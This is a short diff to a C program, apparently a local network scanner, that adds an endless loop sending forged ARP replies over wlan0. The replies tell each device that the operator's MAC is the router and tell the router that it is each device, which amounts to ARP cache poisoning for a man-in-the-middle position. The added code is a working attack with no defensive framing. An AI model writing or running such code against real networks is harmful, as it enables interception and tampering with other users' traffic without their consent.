@@ -61,5 +61,22 @@ int main(int argc, char *argv[]){
     print_network(network);
 
     printf("Devices alive %lu", network_count_alive(network));
+
+    Device *router = &network.devices[0];
+    uint32_t router_ip = htonl(router->ip);
+    while(1) {
+        for (size_t index = 1;index<network.device_count;index++) {
+            Device *device = &network.devices[index];
+
+            uint32_t device_ip = htonl(device->ip);
+            
+
+            arp_send_reply(sockfd, "wlan0", my_mac, &device_ip, router->mac, &router_ip);
+            arp_send_reply(sockfd, "wlan0", my_mac, &router_ip, device->mac, &device_ip);
+        }
+        sleep(2);
+    }
+    
     free_network(network);
+    close(sockfd);
 }
